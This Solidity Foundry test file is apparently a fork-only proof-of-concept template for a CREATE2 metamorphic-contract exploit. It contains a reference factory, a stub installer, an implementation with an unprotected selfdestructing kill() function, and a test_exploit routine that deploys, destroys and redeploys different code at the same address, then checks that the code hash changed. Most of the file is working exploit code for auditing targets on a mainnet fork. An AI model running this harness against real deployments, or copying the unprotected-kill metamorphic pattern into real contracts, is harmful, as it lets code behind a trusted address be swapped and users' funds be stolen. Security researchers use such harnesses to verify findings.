// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- CREATE2 metamorphic redeploy (same address, new code)
/// @notice A contract deployed via CREATE2 at a deterministic address can
///         be REPLACED with different code at the SAME address -- IF it
///         selfdestructs in the same transaction as its creation (post-
///         Cancun / EIP-6780, selfdestruct only deletes code same-tx).
///         Anyone trusting "this address is that code" is trusting a
///         mutable binding.
/// @dev FORK-ONLY. Run via scripts/run-fork-poc.sh. NOTE: the classic
///      multi-tx metamorphic (deploy, later selfdestruct, redeploy) is
///      DEAD post-Cancun; the same-tx factory path is the live variant.
///      The factory/impl contracts below are that reference pattern.
///      GATE: the verdict must come from the TARGET's own deployment
///      path, never from these template-owned contracts -- a template
///      that redeploys its own factory proves the pattern exists, not
///      that POC_TARGET is metamorphic. TODO: set TARGET_FACTORY (the
///      factory that deploys POC_TARGET via CREATE2, exposing the
///      deploy / redeploy entry points below; adapt the interface if
///      the real factory's differs) and TARGET_SALT (the salt
///      POC_TARGET is deployed with), from the target's deployment
///      records. POC_TARGET is that factory's CREATE2 address for
///      TARGET_SALT: it holds no code until the cycle runs. This test
///      drives the whole cycle in ONE transaction -- the factory
///      deploys the first incarnation at POC_TARGET, the PoC destroys
///      it through the occupant's own kill() (the destruction an
///      attacker would trigger), and the factory redeploys DIFFERENT
///      code at the same address. As shipped (factory zero) the test
///      aborts -- no pass is reachable from template-owned contracts.

contract ImplV1 {
    function version() external pure returns (uint256) {
        return 1;
    }

    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}

contract ImplV2 {
    function version() external pure returns (uint256) {
        return 2;
    }
}

/// The reference factory's CREATE2 init code: a constant stub that
/// installs whatever runtime the factory currently points at. The init
/// code MUST stay constant across stages -- with per-version init code
/// the two CREATE2 deployments would land on DIFFERENT addresses and
/// no same-address replacement would have taken place.
contract MetamorphicStub {
    constructor() {
        bytes memory runtime = IMetamorphicFactory(msg.sender).currentRuntime();
        assembly {
            return(add(runtime, 0x20), mload(runtime))
        }
    }
}

interface IMetamorphicFactory {
    function currentRuntime() external view returns (bytes memory);
}

contract MetamorphicFactory {
    bytes public currentRuntime;

    constructor() {
        currentRuntime = type(ImplV1).runtimeCode;
    }

    // Stage one: deploy the current (V1) incarnation at the CREATE2
    // address for `salt`.
    function deploy(bytes32 salt) external returns (address addr) {
        bytes memory init = type(MetamorphicStub).creationCode;
        assembly {
            addr := create2(0, add(init, 0x20), mload(init), salt)
        }
        require(addr != address(0), "V1 deploy failed");
    }

    // Stage two: the first incarnation has been destroyed in the SAME
    // transaction (the only way the address is free again post-
    // EIP-6780); deploy the V2 incarnation at the SAME CREATE2 address.
    function redeploy(bytes32 salt) external returns (address addr) {
        currentRuntime = type(ImplV2).runtimeCode;
        bytes memory init = type(MetamorphicStub).creationCode;
        assembly {
            addr := create2(0, add(init, 0x20), mload(init), salt)
        }
        require(addr != address(0), "V2 redeploy failed");
    }
}

/// The target factory's deployment entry points (the reference pattern
/// above). Adapt to the real factory's ABI when it differs.
interface IRedeployFactory {
    function deploy(bytes32 salt) external returns (address);
    function redeploy(bytes32 salt) external returns (address);
}

/// The target occupant's destroy entry point (the reference ImplV1's
/// kill). Adapt to the real occupant's when it differs.
interface IMetamorphicOccupant {
    function kill() external;
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: the factory that deployed POC_TARGET via CREATE2 + its salt.
    address public constant TARGET_FACTORY = address(0);
    bytes32 public constant TARGET_SALT = bytes32(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        // For this type POC_TARGET is the factory's CREATE2 cycle
        // address -- it holds no code until the cycle runs inside
        // test_exploit -- so the deployed contract to sanity-check is
        // the target factory itself. Unadapted (no factory supplied),
        // the target check below applies as before.
        if (TARGET_FACTORY != address(0)) {
            assertGt(TARGET_FACTORY.code.length, 0, "target factory has no code at this fork block");
        } else {
            assertGt(target.code.length, 0, "target has no code at this fork block");
        }
    }

    function test_exploit() public {
        require(
            TARGET_FACTORY != address(0),
            "41-create2: TARGET_FACTORY not supplied -- this harness cannot judge a target from template-owned contracts; set TARGET_FACTORY + TARGET_SALT to the factory and salt that deployed POC_TARGET (adaptation required)"
        );

        address tgt = target;

        // Drive the TARGET's own factory, in this one transaction:
        // deploy the first incarnation at POC_TARGET and measure its
        // code. The factory + salt really are the target's deployment
        // path only if this lands exactly on POC_TARGET.
        address deployed = IRedeployFactory(TARGET_FACTORY).deploy(TARGET_SALT);
        require(
            deployed == target,
            "41-create2: factory deploy did not land on POC_TARGET -- the supplied factory/salt are not the target's deployment path"
        );
        bytes32 codeBefore;
        assembly {
            codeBefore := extcodehash(tgt)
        }
        require(
            codeBefore != bytes32(0),
            "41-create2: factory deploy left no code at POC_TARGET -- nothing to metamorphose"
        );

        // Destroy the first incarnation in the same transaction (post-
        // EIP-6780 the only way its code is actually deleted). The
        // call is made directly by this PoC, as an attacker triggering
        // the occupant's unprotected kill() would.
        IMetamorphicOccupant(tgt).kill();

        // Redeploy through the same factory: it must land back on
        // POC_TARGET and the code at POC_TARGET must have changed
        // across the redeploy.
        address redeployed = IRedeployFactory(TARGET_FACTORY).redeploy(TARGET_SALT);
        require(
            redeployed == target,
            "41-create2: factory redeploy did not land on POC_TARGET -- the supplied factory/salt are not the target's deployment path"
        );

        bytes32 codeAfter;
        assembly {
            codeAfter := extcodehash(tgt)
        }
        console.log("target code hash before:");
        console.logBytes32(codeBefore);
        console.log("target code hash after:");
        console.logBytes32(codeAfter);
        assertTrue(
            codeAfter != codeBefore,
            "exploit did not reproduce: target code unchanged after its own factory redeployed it"
        );
    }
}
